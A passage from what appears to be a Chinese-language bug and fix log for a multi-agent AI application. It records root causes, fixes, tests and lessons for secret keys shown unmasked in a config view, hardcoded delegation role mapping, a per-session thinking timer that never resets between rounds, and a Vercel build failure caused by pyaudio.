**根因：** `get_config`（api/main.py:764）返回 `_MODIFIABLE_CONFIG_KEYS` 内全部配置项（含模型/语音/视觉密钥），前端运行时配置表对非对象值一律 `String(v)` 明文输出。这些密钥均有专属 password 式配置区（主模型配置等），运行表明文展示属冗余暴露（窥屏/日志泄露风险）。

**状态：** 已确认同类问题，待修复（前端对密钥字段 masked 显示 `••••`，编辑走 password 输入）。

**教训：** 允许展示的配置清单（`_MODIFIABLE_FIELDS`）本身含密钥类字段；任何"全量配置渲染"界面都必须按字段名屏蔽密钥值（KEY/TOKEN/SECRET/PASSWORD 模式）。

## 79. 委托角色名解析硬编码（delegation_port ROLE_TO_IDENTITY，后端，§77 同类隐患）

**现象：** `modules/thinking/core/delegation_port.py:135` 的 `ROLE_TO_IDENTITY` 是**硬编码** role 名 → (tier, identity_key) 映射表。新增 supervisor/expert 角色（含编排页自定义 agent）时若不同步更新此表，`delegate_task` 报 `未知委托角色`。

**根因：** 提示词侧的角色列表是**动态**的（`composer._build_supervisor_table()/_build_expert_table()` 从 roles.yaml 实时读取所有 tier=supervisor/expert 角色注入总指挥/主管；`identity.get_identities()` 还合并了编排页自定义 agent），但委托执行侧 `_resolve_role` 只能解析硬编码映射表。动态列 vs 硬编码解析不一致 → 新增角色可直接委托界面列出、却实际无法委托。已实测：`security_supervisor`、`data_expert` → `_resolve_role` 返回 `None`。

**附加隐患：** `_build_supervisor_table/_build_expert_table` 仅读 `roles.yaml`，不含编排页自定义 agent（合并进 identities 但不出现在委托引导列表）。

**修复：**
1. `_resolve_role` 加动态回退：`ROLE_TO_IDENTITY` 未命中时查 `get_identities()`（含编排页自定义 agent，直接/子串匹配）——新增角色无需改映射表即可委托。
2. `_build_supervisor_table/_build_expert_table` 改为合并自定义 agent（composer `_merged_roles`，以注入 loader 为基础 + `settings.get_custom_agents()`）。
3. **可委托角色表格按模型权限在 system prompt 注入**，不再走黑板：
   - 移除 `multi_model_orchestrator.py` 写入黑板的 `delegation_guidance`（含可用主管/可用专家表）
   - `_build_capability_table`：large → 主管表+专家表；supervisor → 专家表；expert → 无
   - 删除 `continuous_thinker._build_expert_context_section` **硬编码角色表**（含旧名 `test_writer`/`data_analyzer`/`memory_manager`/`emotion`，与 roles.yaml 不一致且漏 `ui_designer`/`customer`）
   - `delegate_task` 工具 role 描述同步改为「可委托的主管」「可委托的专家」

**验证：** delegation_port 新增 2 动态回退测试；composer 新增自定义 agent 合并测试；`test_build_expert_context_only_large` 改为 `test_expert_context_moved_to_system_prompt`（large 主管+专家表 / supervisor 专家表 / expert 无表）；相关 180 测试 + orchestrator 89 测试通过。

**教训：** "提示词动态列举的能力"必须与"执行侧可解析的集合"同源同生，否则出现 UI/提示词看得到、实际跑不通的脱节。可委托角色表格是"模型权限"信息，应随 system prompt 按 tier 注入，而非全局黑板广播（避免重复注入+越权可见）；硬编码角色名会随 roles.yaml 演化而失配。

## 80. "正在思考 Ns" 计时从会话连接起算，而非当前任务（后端 api_stream）

**现象：** 前端"正在思考 Xs"（`ThinkingStatusPanel`/`ThinkingIndicator`）的秒数持续偏大，同一会话内连续提问时，后一轮的秒数从上一轮累加，不是本轮真实耗时。

**根因：** `modules/thinking/api_stream.py` 的 `started_at` 只在 `start(session_id)`（WS 连接建立 / 会话创建）时设置一次；每轮用户消息走 `think()`，全程不复位 `started_at`。WS `status` 消息的 `elapsed_s = int(now - started_at)` 因此从"会话连接时刻"起算，而不是"本轮思考开始"。

**修复：** 在 `think()` 中 `_set_processing(session_id, True)` 之后、开始调度之前，于锁内重置 `self.sessions[session_id]["started_at"] = time.time()` —— 每轮任务开始重新计时。前端 `chat.elapsed` 完全消费后端推送的 `elapsed_s`，无本地计时器，无需改动。

**验证：** 新增 `test_api_stream_think_ext.py::test_think_resets_started_at_per_round`（旧 started_at 被重置、连续两轮各自刷新计时起点）；api_stream 全部 183 测试通过。

**教训：** "会话生命周期"计时与"任务/轮次生命周期"计时是两种语义，不能混用同一个时间戳。WS 状态推送的耗时类字段必须挂在"本轮处理"的起点上，否则 UI 展示的耗时失真。

## 81. Vercel 部署失败：pyaudio 编译需要 portaudio.h（服务器/无头环境依赖治理）

**现象：** 部署到 Vercel 时构建失败：
```
error: Command '['cc', ..., '-c', 'src/pyaudio/device_api.c', ...]' returned non-zero exit status 1
hint: This error likely indicates that you need to install a library that provides "portaudio.h"
help: `pyaudio` (v0.2.14) was included because `cortex-agent` depends on `pyaudio`
```

**根因：** `requirements.txt` 把 `pyaudio` 列为必需依赖。PyAudio 是 PortAudio 的 C 扩展，pip 安装需编译（源码无 wheel），编译依赖系统开发头文件 `portaudio.h`。Vercel Python 沙箱没有该库，且无 apt 可装。pyaudio 仅用于本地麦克风录音（`modules/perception/detectors/voice_detector.py` / `hotkey_voice_detector.py`），服务器/无头环境既无法编译也无用途。

**修复：** 将本地硬件/桌面专用依赖从主 `requirements.txt` 移出，新建 `requirements-voice.txt`：
- 移除：`pyaudio`、`pynput`（全局热键）、`pyautogui`（桌面自动化）、`pyserial`（串口）
- 保留：`SpeechRecognition`、`gTTS`、`openai-whisper`（纯 Python / 服务器可装）
- 语音检测器已做延迟导入 + `_check_availability()` 的 `except ImportError` 降级（`is_available()=False` 不启动），无顶层 `import pyaudio`，缺失时不影响核心功能。

**验证：** `test_detectors.py`/`test_voice_hotkey.py`/`test_perception.py` 107 测试通过；requirements.txt 语法合法；语音/桌面模块均函数内延迟 import。

**教训：** 服务端部署（Vercel 等沙箱构建）不能包含依赖系统 C 库/无 wheel 的本地硬件包。此类依赖应独立成可选文件（如 requirements-voice.txt），并在代码层做延迟导入 + ImportError 优雅降级，让"装了有功能、没装不崩溃"。
